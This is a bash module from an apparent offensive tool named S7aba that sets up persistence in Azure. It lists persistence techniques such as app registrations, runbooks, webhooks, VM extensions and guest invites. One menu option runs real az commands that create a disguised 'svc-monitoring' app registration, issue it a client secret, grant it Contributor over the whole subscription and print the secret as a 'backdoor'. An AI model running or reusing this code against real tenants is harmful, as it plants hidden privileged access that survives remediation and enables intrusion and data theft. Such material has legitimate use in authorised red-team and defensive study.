#!/usr/bin/env bash
# S7aba - Azure Persistence Module

enumerate_persistence_options() {
    log_info "Evaluating Azure persistence techniques..."
    log_finding "HIGH" "App Registration" "Create app with client secret for persistent SP access"
    log_finding "HIGH" "Automation Runbook" "Create scheduled runbook with RunAs account"
    log_finding "MEDIUM" "Webhook" "Create Automation webhook for external trigger"
    log_finding "MEDIUM" "Logic App" "Create Logic App with managed identity and recurring trigger"
    log_finding "MEDIUM" "Extension" "Deploy VM extension for persistent code execution"
    log_finding "INFO" "Role Assignment" "Assign roles to backdoor service principal"
    log_finding "INFO" "B2B Invite" "Invite external guest user with role assignments"
}

deploy_persistence() {
    log_warn "Select persistence mechanism:"
    echo -e "  1) Create App Registration with secret"
    echo -e "  2) Add credentials to existing app"
    echo -e "  3) Invite B2B guest user"
    read -rp "$(echo -e "${YELLOW}[?] Choice: ${RESET}")" choice

    case "$choice" in
        1)
            local app_name="svc-monitoring-$(date +%s | tail -c 5)"
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create app '$app_name' with client secret"
            else
                local app
                app=$(az ad app create --display-name "$app_name" -o json 2>/dev/null)
                local app_id
                app_id=$(echo "$app" | jq -r '.appId')
                local cred
                cred=$(az ad app credential reset --id "$app_id" -o json 2>/dev/null)
                local sp
                sp=$(az ad sp create --id "$app_id" -o json 2>/dev/null)
                az role assignment create --role "Contributor" --assignee "$app_id" \
                    --scope "/subscriptions/$(az account show --query id -o tsv)" 2>/dev/null
                log_success "Backdoor app '$app_name' created with Contributor role"
                log_info "App ID: $app_id"
                log_info "Secret: $(echo "$cred" | jq -r '.password')"
                log_info "Tenant: $(echo "$cred" | jq -r '.tenant')"
            fi
            ;;
        *)
            log_info "Selected mechanism requires manual implementation"
            ;;
    esac
}
